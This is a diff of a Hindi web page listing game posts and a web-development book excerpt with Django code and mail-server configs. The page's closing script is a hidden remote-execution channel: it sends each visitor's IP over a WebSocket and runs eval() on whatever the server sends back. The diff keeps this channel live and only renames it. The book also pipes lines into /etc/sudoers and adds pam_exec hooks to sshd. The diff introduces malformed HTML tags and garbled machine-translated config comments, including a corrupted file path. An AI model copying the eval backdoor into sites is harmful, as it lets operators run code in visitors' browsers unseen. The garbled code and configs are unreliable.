@@ -140,11 +140,12 @@
 
 
 <div id="0" style="white-space: pre-wrap;">तीन तेरह - ऑनलाइन कार्ड गेम
-आमंत्रित कोड उत्पन्न करने या गेम में शामिल होने के लिए नीचे दिए गए लिंक पर क्लिक करके एक दोस्त के साथ तीन तेरह खेलें।<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card/" title="Invite a friend">कोड के साथ आमंत्रित करें</a>
-<a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">खेल में शामिल हो</a>
-<script src="/static/games/threethirteen.js"></script>***</div>
+आमंत्रित कोड उत्पन्न करने या गेम में शामिल होने के लिए नीचे दिए गए लिंक पर क्लिक करके एक दोस्त के साथ तीन तेरह खेलें।<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card-result-once-single/" title="Invite a friend">कोड के साथ आमंत्रित करें</a>
+<a "="" class="btn btn-success" games="" href="&lt;a href=" https:="" lotteh.com="" title="Visit this link (it will take you outside of Lotte Harper)">lotteh.com/games/</a>"शीर्षक =" एक खेल में शामिल हों "&gt; खेल में शामिल हों
+<script src="/static/games/threethirteen.js"></script>
+</div>
 
-<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/dd9c654e-2b32-41f1-b4ac-8799e7cfe226.png" id="img0" alt="खरीददारी"/><p>द्वारा Daisy / <a href="/hi/three-thirteen---online-card" title="पोस्ट देखें">देखना</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="खरीदना Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="क्रिप्टोक्यूरेंसी के साथ खरीदें Lotte Harper">क्रिप्टोक्यूरेंसी के साथ खरीदें</a></p><hr>
+<div><img width="100%" height="auto" src="https://i.imgur.com/8I5qWNu.png" id="img0" alt="खरीददारी"/><p>द्वारा Daisy / <a href="/hi/three-thirteen---online-card" title="पोस्ट देखें">देखना</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="खरीदना Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="क्रिप्टोक्यूरेंसी के साथ खरीदें Lotte Harper">क्रिप्टोक्यूरेंसी के साथ खरीदें</a></p><hr>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -163,7 +164,17 @@
 
 <hr></div>
 
-<div id="1" style="white-space: pre-wrap;">उदाहरण के लिए व्यावहारिक वेब आधारित गहरी शिक्षा और सुरक्षा
+<div id="1" style="white-space: pre-wrap;">खेल रंग सुडोकू ऑनलाइन - मुफ्त कोलोर्डोकू खेल
+यह रंग सुदोकू (कोलोर्डोकू) खेल खेलने के लिए एक स्वतंत्र है।<canvas class="game" id="game197"></canvas>
+<script src="/static/js/createjs.min.js"></script>
+<script src="/static/games/colordokugames.js"></script>
+<script src="/static/games/colordoku.js"></script>
+</div>
+
+<div><p>द्वारा Daisy / <a href="/hi/play-color-sudoku-online---free" title="पोस्ट देखें">देखना</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a" title="खरीदना Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a&crypto=ETH" title="क्रिप्टोक्यूरेंसी के साथ खरीदें Lotte Harper">क्रिप्टोक्यूरेंसी के साथ खरीदें</a></p><hr>
+</div>
+
+<div id="2" style="white-space: pre-wrap;">उदाहरण के लिए व्यावहारिक वेब आधारित गहरी शिक्षा और सुरक्षा
 तीसरा संस्करण
 शार्लोट हार्पर
 3 जुलाई, 2024
@@ -878,7 +889,7 @@ def activate(request, uidb64, token):
         user.profile.email_verified = True
         user.profile.save()
         user.save()
-# sendwelcomeemail (अनुरोध, उपयोगकर्ता)
+# Sendwelcomeemail (अनुरोध, उपयोगकर्ता)
         messages.success(request, f'Thanks for confirming your email! You can now log into your account, and a welcome email has been sent to you.')
         return redirect(user.profile.create_face_url())
     else:
@@ -919,7 +930,7 @@ def register(request):
             messages.success(request, 'Welcome to the app, {}.'.format(user.username))
     return render(request, 'users/register.html', {'form': UserRegisterForm})
 </code></pre>अब, हमें सक्रियण ईमेल को फिर से तैयार करने के लिए एक फॉर्म जोड़ना होगा। उपयोगकर्ताओं/forms.py में, निम्न फॉर्म जोड़ें:<pre class="language-python"><code>
-# … (राशि)
+# … (आयात)
 class ResendActivationEmailForm(forms.Form):
     email = forms.EmailField(required=True)
 </code></pre>हमें इस रेसेंड ईमेल सक्रियण फॉर्म के अनुरूप एक टेम्पलेट की भी आवश्यकता होगी। आइए इस टेम्पलेट को जोड़ें। फ़ाइल को संपादित करें:<pre class="language-bash"><code>
@@ -2032,7 +2043,7 @@ UsePAM yes
 X11Forwarding yes
 # X11DISPLAYOFFSET 10
 # X11uselocalhost हाँ
-# गोली हाँ
+# परमिट्टी हाँ
 PrintMotd no
 # PrintLastLog हाँ
 # Tcpkeepalive हाँ
@@ -2268,7 +2279,7 @@ cd $DIR
 echo "Creating virtual environment"
 python -m venv venv
 source venv/bin/activate
-# निर्भरता प्राप्त करें और निर्माण करें
+# निर्भरताएं प्राप्त करें और निर्माण करें
 echo "Getting and building dependencies, this may take a whike"
 cd $DIR
 git clone https://github.com/sukhitashvili/violence-detection.git
@@ -2398,7 +2409,7 @@ echo "Setup crontab/sudoers configuration"
 sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
 sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
 # पाम कॉन्फ़िगरेशन इंजेक्ट करें और दोषपूर्ण SSH कॉन्फ़िगरेशन निकालें
-# Sudo sed -i '' -and $ d '/etc/pam.d/sshd
+# sudo sed -i '' -e '$ d' /tc/pam.d/sshd
 # Sudo sed -i '' -and $ d ' /etc /प्रोफ़ाइल
 echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
 echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
@@ -2934,12 +2945,12 @@ submission inet n       -       y       -       -       smtpd
 # -ओ smtpd_client_restrictions = $ mua_client_restrictions
 # -O SMTPD_HELO_RESTRICTIONS = $ MUA_HELO_RESTRICTIONS
 # -O SMTPD_SENDER_RESTRICTIONS = $ MUA_SENDER_RESTRICTIONS
-# -ओ SMTPD_RECIPIENT_RESTRICTIONS =
+# -ओ SMTPD_RECIPIENT_TRASTRICTIONS =
 # -O SMTPD_RELAY_RESTRICTIONS = PERMIT_SASL_AUTHENTICATED, अस्वीकार करें
 # -ओ milter_macro_daemon_name = मूल
 # एक चुनें: केवल लूपबैक क्लाइंट के लिए, या किसी भी क्लाइंट के लिए SMTPs सक्षम करें।
 # 127.0.0.1:smtps inet n - y - - smtpd
-# smtps inet n - y - - smtpd
+# Smtps inet n - y - - smtpd
 # -ओ syslog_name = postfix/smtps
 # -ओ smtpd_tls_wrappermode = हाँ
 # -ओ smtpd_sasl_auth_enable = हाँ
@@ -2947,14 +2958,14 @@ submission inet n       -       y       -       -       smtpd
 # -ओ smtpd_client_restrictions = $ mua_client_restrictions
 # -O SMTPD_HELO_RESTRICTIONS = $ MUA_HELO_RESTRICTIONS
 # -O SMTPD_SENDER_RESTRICTIONS = $ MUA_SENDER_RESTRICTIONS
-# -ओ SMTPD_RECIPIENT_RESTRICTIONS =
+# -ओ SMTPD_RECIPIENT_TRASTRICTIONS =
 # -O SMTPD_RELAY_RESTRICTIONS = PERMIT_SASL_AUTHENTICATED, अस्वीकार करें
 # -ओ milter_macro_daemon_name = मूल
 # 628 inet n - y - - qmqpd
 pickup    unix  n       -       y       60      1       pickup
 cleanup   unix  n       -       y       -       0       cleanup
 qmgr      unix  n       -       n       300     1       qmgr
-# QMGR UNIX N - N 300 1 OQMG
+# QMGR UNIX N - N 300 1 OQMGR
 tlsmgr    unix  -       -       y       1000?   1       tlsmgr
 rewrite   unix  -       -       y       -       -       trivial-rewrite
 bounce    unix  -       -       y       -       0       bounce
@@ -3016,7 +3027,7 @@ maildrop  unix  -       n       n       -       -       pipe
 # ====================================================================== =====================
 # साइरस के माध्यम से वितरण का पुराना उदाहरण।
 # 
-# पुराना -कोरस यूनिक्स - एन एन - - पाइप
+# ओल्ड -सीरस यूनिक्स - एन एन - - पाइप
 # झंडे = r उपयोगकर्ता = साइरस argv =/cyrus/bin/delive -e -m $ {एक्सटेंशन} $ {उपयोगकर्ता}
 # 
 # ====================================================================== =====================
@@ -3084,7 +3095,7 @@ nano config/etc_dovecot_conf.d_10-master.conf
 
 # लॉगिन उपयोगकर्ता आंतरिक रूप से लॉगिन प्रक्रियाओं द्वारा उपयोग किया जाता है। यह सबसे अविश्वसनीय है
 # Dovecot सिस्टम में उपयोगकर्ता। यह किसी भी चीज़ तक पहुंच नहीं होनी चाहिए।
-# default_login_user = devenull
+# default_login_user = dovenull
 
 # आंतरिक उपयोगकर्ता का उपयोग अप्रत्याशित प्रक्रियाओं द्वारा किया जाता है। यह से अलग होना चाहिए
 # लॉगिन उपयोगकर्ता, ताकि लॉगिन प्रक्रियाएं अन्य प्रक्रियाओं को परेशान न कर सकें।
@@ -3105,7 +3116,7 @@ service imap-login {
   # Service_count = 1
 
   # हमेशा अधिक कनेक्शन की प्रतीक्षा करने के लिए प्रक्रियाओं की संख्या।
-  # process_min_avail = 0
+  # Process_min_avail = 0
 
   # यदि आप service_count = 0 सेट करते हैं, तो आपको शायद इसे बढ़ाने की आवश्यकता है।
   # Vsz_limi = $ default_vsz_limit
@@ -3145,7 +3156,7 @@ service lmtp {
 service imap {
   # अधिकांश मेमोरी MMAP () आईएनजी फ़ाइलों पर जाती है। आपको इसे बढ़ाने की आवश्यकता हो सकती है
   # यदि आपके पास विशाल मेलबॉक्स हैं तो सीमा।
-  # Vsz_limi = $ default_vsz_limit
+  # vsz_limit = $ default_vsz_limit
 
   # अधिकतम। IMAP प्रक्रियाओं की संख्या (कनेक्शन)
   # process_limit = 1024
@@ -3261,7 +3272,7 @@ nano config/etc_dovecot_dovecot
 # अधिक वर्बोज़ प्रक्रिया शीर्षक (पीएस में) दिखाएं। वर्तमान में उपयोगकर्ता का नाम दिखाता है और
 # आईपी ​​पता। यह देखने के लिए उपयोगी है कि वास्तव में IMAP प्रक्रियाओं का उपयोग कौन कर रहे हैं
 # (उदाहरण के लिए साझा मेलबॉक्स या यदि एक ही यूआईडी का उपयोग कई खातों के लिए किया जाता है)।
-# verbose_proctitle = नहीं
+# Verbose_procitle = नहीं
 
 # क्या सभी प्रक्रियाओं को मार दिया जाना चाहिए जब Dovecot मास्टर प्रक्रिया बंद हो जाती है।
 # इसे "नहीं" पर सेट करने का मतलब है कि डोवेकॉट को बिना अपग्रेड किए जा सकते हैं
@@ -3390,7 +3401,7 @@ nano config/etc_default_opendkim
 # इसके बजाय /etc/opendkim.conf।
 # 
 # पहले, कोई डिफ़ॉल्ट सेटिंग्स को यहां संपादित करेगा, और फिर निष्पादित करेगा
-# /lib/opendkim/opendkim.service.generate systemd ओवरराइड फ़ाइलों को उत्पन्न करने के लिए
+# /lib/opendkim/opendkim.service.generate systemd override फ़ाइलों को उत्पन्न करने के लिए
 # /etc/systemd/system/opendkim.service.d/override.conf और
 # /etc/tmpfiles.d/opendkim.conf। जबकि यह अभी भी संभव है, यह अब है
 # सीधे /etc/opendkim.conf में सेटिंग्स को समायोजित करने की सिफारिश की।
@@ -3409,7 +3420,7 @@ SOCKET="local:/var/spool/postfix/opendkim/opendkim.sock"
 # सॉकेट = inet: 54321
 # पोर्ट 12345 पर लूपबैक पर सुनें:
 # सॉकेट = inet: 12345@लोकलहोस्ट
-# पोर्ट 12345 पर 192.0.2.1 पर सुनें:
+# सुनो 192.0.2.1 पोर्ट 12345 है:
 # सॉकेट = inet: 12345@192.0.2.1
 USER=opendkim
 GROUP=opendkim
@@ -3572,23 +3583,14 @@ source venv/bin/activate
 <div><p>द्वारा Daisy / <a href="/hi/practical-web-based-deep" title="पोस्ट देखें">देखना</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="खरीदना Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=ETH" title="क्रिप्टोक्यूरेंसी के साथ खरीदें Lotte Harper">क्रिप्टोक्यूरेंसी के साथ खरीदें</a></p><hr>
 </div>
 
-<div id="2" style="white-space: pre-wrap;">दो खिलाड़ी रंग सुडोकू ऑनलाइन मुफ्त
+<div id="3" style="white-space: pre-wrap;">दो खिलाड़ी रंग सुडोकू ऑनलाइन मुफ्त
 मुफ्त में एक दोस्त के साथ सहयोगी रंग सुडोकू खेलें।<a class="btn btn-info" href="https://lotteh.com/games/two-player-color-sudoku-online/" title="Invite a friend">किसी मित्र को आमंत्रित करें</a>
 <a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">एक खेल में शामिल हों</a>
 <script src="https://lotteh.com/static/games/colordokugames2.js"></script>
-<script src="https://lotteh.com/static/games/twoplayercolordoku.js"></script>***</div>
-
-<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/c820300b-3430-4988-86fd-e77352fca488.png" id="img2" alt="खरीददारी"/><p>द्वारा Daisy / <a href="/hi/two-player-color-sudoku-online" title="पोस्ट देखें">देखना</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488" title="खरीदना Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488&crypto=ETH" title="क्रिप्टोक्यूरेंसी के साथ खरीदें Lotte Harper">क्रिप्टोक्यूरेंसी के साथ खरीदें</a></p><hr>
+<script games="" https:="" lotteh.com="" src="&lt;a href=" static="" title="Visit this link (it will take you outside of Lotte Harper)" twoplayercolordoku.js"="">lotteh.com/static/games/twoplayercolordoku.js</a>"></script>
 </div>
 
-<div id="3" style="white-space: pre-wrap;">खेल रंग सुडोकू ऑनलाइन - मुफ्त कोलोर्डोकू खेल
-यह रंग सुदोकू (कोलोर्डोकू) खेल खेलने के लिए एक स्वतंत्र है।
-***<canvas class="game" id="game197"></canvas>
-<script src="/static/js/createjs.min.js"></script>
-<script src="/static/games/colordokugames.js"></script>
-<script src="/static/games/colordoku.js"></script></div>
-
-<div><p>द्वारा Daisy / <a href="/hi/play-color-sudoku-online---free" title="पोस्ट देखें">देखना</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a" title="खरीदना Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a&crypto=ETH" title="क्रिप्टोक्यूरेंसी के साथ खरीदें Lotte Harper">क्रिप्टोक्यूरेंसी के साथ खरीदें</a></p><hr>
+<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/c820300b-3430-4988-86fd-e77352fca488.png" id="img3" alt="खरीददारी"/><p>द्वारा Daisy / <a href="/hi/two-player-color-sudoku-online" title="पोस्ट देखें">देखना</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488" title="खरीदना Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488&crypto=ETH" title="क्रिप्टोक्यूरेंसी के साथ खरीदें Lotte Harper">क्रिप्टोक्यूरेंसी के साथ खरीदें</a></p><hr>
 </div>
 
 <div id="4" style="white-space: pre-wrap;"><p>मैं गतिरोध कैसे पहनूं?</p><p><br/></p><p>1। अपने बालों को वांछित लंबाई तक बढ़ाकर शुरू करें। आपके बाल सबसे अच्छे परिणामों के लिए कम से कम 2-3 इंच लंबा होना चाहिए।</p><p><br/></p><p>2। अपने बालों को छोटे, यहां तक ​​कि एक कंघी का उपयोग करके भागों में भाग लें। वर्गों का आकार आपके dreadlocks के आकार को निर्धारित करेगा, इसलिए एक आकार चुनना सुनिश्चित करें जिसके साथ आप सहज हैं।</p><p><br/></p><p>3। बालों के प्रत्येक खंड को मुड़कर और जड़ों की ओर कसकर खींचकर वापस शुरू करें। यह बालों में गांठें पैदा करेगा, जो अंततः dreadlocks में बन जाएगा।</p><p><br/></p><p>4। बालों के प्रत्येक खंड पर मोम या जेल लागू करें और जगह में समुद्री मील को पकड़ने में मदद करें और बालों को एक साथ चटाई के लिए प्रोत्साहित करें।</p><p><br/></p><p>5। जब तक आप अपना पूरा सिर पूरा नहीं कर लेते, तब तक बालों के प्रत्येक खंड को बैककॉम करना और घुमाना जारी रखें। यह प्रक्रिया समय लेने वाली हो सकती है, इसलिए धैर्य रखें और आवश्यकतानुसार ब्रेक लें।</p><p><br/></p><p>6। एक बार जब आपके सभी बाल मुड़ गए और बैककॉम हो गए, तो इसे कुछ दिनों के लिए बैठने दें ताकि गांठों को कसने और ड्रेडलॉक में बनाने की अनुमति दी जा सके।</p><p><br/></p><p>।</p><p><br/></p><p>8। अपने dreadlocks को साफ -सुथरा और सुव्यवस्थित रखने के लिए, सोते समय या गंदे वातावरण में उन्हें कवर करने के लिए दुपट्टा या बंदना का उपयोग करने पर विचार करें। नियमित रखरखाव और रखरखाव आपके dreadlocks को स्वस्थ और जीवंत रहने में मदद करेगा।</p></div>
@@ -3769,9 +3771,9 @@ source venv/bin/activate
 </div>
 <div style="margin:auto;" class="center col-md-6 p-3 rounded mb-3 bg-white">
 <div class="mb-2" style="display: flex; justify-content: space-around;">
-<a title="फेसबुक पर सांझा करें" target="_blank" class="btn btn-light btn-xlarge" href="https://www.facebook.com/dialog/feed?&app_id=845349032833671&link=https%3A%2F%2Fglamgirlx.com%2Fhi%2Fnews%3F&quote=Visit%20this%20link%20on%20Glam%20Girl%20X&display=popup&hashtag=#lotteh&redirect_uri=https%3A%2F%2Fglamgirlx.com" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16"  style="text-color: #4267B2 !important; color: #4267B2 !important;">
+<a title="फेसबुक पर सांझा करें" target="_blank" class="btn btn-light btn-xlarge" href="https://www.facebook.com/dialog/feed?&app_id=845349032833671&link=https%3A%2F%2Fglamgirlx.com%2Fhi%2Fnews%3F&quote=Three%20Thirteen%20-%20Online%20Card%20Game&display=popup&hashtag=#lotteh&redirect_uri=https%3A%2F%2Fglamgirlx.com" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16"  style="text-color: #4267B2 !important; color: #4267B2 !important;">
   <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"/></svg></a>
-<a title="ट्विटर पर साझा करें" target="_blank" class="btn btn-xlarge btn-light" href="https://twitter.com/intent/tweet/?text=Visit%20this%20link%20on%20Glam%20Girl%20X%20-&url=https://glamgirlx.com/hi/news?" title="Share on Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16" style="text-color: #1DA1F2 !important; color: #1DA1F2 !important;">
+<a title="ट्विटर पर साझा करें" target="_blank" class="btn btn-xlarge btn-light" href="https://twitter.com/intent/tweet/?text=Three%20Thirteen%20-%20Online%20Card%20Game%20-&url=https://glamgirlx.com/hi/news?" title="Share on Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16" style="text-color: #1DA1F2 !important; color: #1DA1F2 !important;">
   <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334q.002-.211-.006-.422A6.7 6.7 0 0 0 16 3.542a6.7 6.7 0 0 1-1.889.518 3.3 3.3 0 0 0 1.447-1.817 6.5 6.5 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.32 9.32 0 0 1-6.767-3.429 3.29 3.29 0 0 0 1.018 4.382A3.3 3.3 0 0 1 .64 6.575v.045a3.29 3.29 0 0 0 2.632 3.218 3.2 3.2 0 0 1-.865.115 3 3 0 0 1-.614-.057 3.28 3.28 0 0 0 3.067 2.277A6.6 6.6 0 0 1 .78 13.58a6 6 0 0 1-.78-.045A9.34 9.34 0 0 0 5.026 15"/>
 </svg></a>
 <a title="Pinterest पर साझा करें" target="_blank" class="btn btn-xlarge btn-light" href="https://www.pinterest.com/pin/create/button/?url=https://glamgirlx.com/hi/news?" title="Share on Pinterest"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-pinterest" viewBox="0 0 16 16" style="filter: invert(21%) sepia(58%) saturate(4534%) hue-rotate(338deg) brightness(81%) contrast(128%);">
@@ -3783,7 +3785,7 @@ source venv/bin/activate
 </div>
 <div class="mb-2" style="display: flex; justify-content: space-around;">
 <a title="टम्बल पर साझा करें" target="_blank" class="btn btn-xlarge btn-light" href="http://tumblr.com/widgets/share/tool?canonicalUrl=https://glamgirlx.com/hi/news?"><img src="/media/icons/tumblr-logo.svg" width="30" height="30" alt="Tumblr" style="filter: invert(28%) sepia(8%) saturate(3348%) hue-rotate(169deg) brightness(92%) contrast(82%);"></img></a>
-<a title="रेडिट पर शेयर" target="_blank" class="btn btn-xlarge btn-light" href="http://www.reddit.com/submit?url=https://glamgirlx.com/hi/news?&title=Visit%20this%20link%20on%20Glam%20Girl%20X"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-reddit" viewBox="0 0 16 16" style="text-color: #FF4500 !important; color: #FF4500 !important;">
+<a title="रेडिट पर शेयर" target="_blank" class="btn btn-xlarge btn-light" href="http://www.reddit.com/submit?url=https://glamgirlx.com/hi/news?&title=Three%20Thirteen%20-%20Online%20Card%20Game"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-reddit" viewBox="0 0 16 16" style="text-color: #FF4500 !important; color: #FF4500 !important;">
   <path d="M6.167 8a.83.83 0 0 0-.83.83c0 .459.372.84.83.831a.831.831 0 0 0 0-1.661m1.843 3.647c.315 0 1.403-.038 1.976-.611a.23.23 0 0 0 0-.306.213.213 0 0 0-.306 0c-.353.363-1.126.487-1.67.487-.545 0-1.308-.124-1.671-.487a.213.213 0 0 0-.306 0 .213.213 0 0 0 0 .306c.564.563 1.652.61 1.977.61zm.992-2.807c0 .458.373.83.831.83s.83-.381.83-.83a.831.831 0 0 0-1.66 0z"/>
   <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0m-3.828-1.165c-.315 0-.602.124-.812.325-.801-.573-1.9-.945-3.121-.993l.534-2.501 1.738.372a.83.83 0 1 0 .83-.869.83.83 0 0 0-.744.468l-1.938-.41a.2.2 0 0 0-.153.028.2.2 0 0 0-.086.134l-.592 2.788c-1.24.038-2.358.41-3.17.992-.21-.2-.496-.324-.81-.324a1.163 1.163 0 0 0-.478 2.224q-.03.17-.029.353c0 1.795 2.091 3.256 4.669 3.256s4.668-1.451 4.668-3.256c0-.114-.01-.238-.029-.353.401-.181.688-.592.688-1.069 0-.65-.525-1.165-1.165-1.165"/>
 </svg></a>
@@ -3885,32 +3887,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
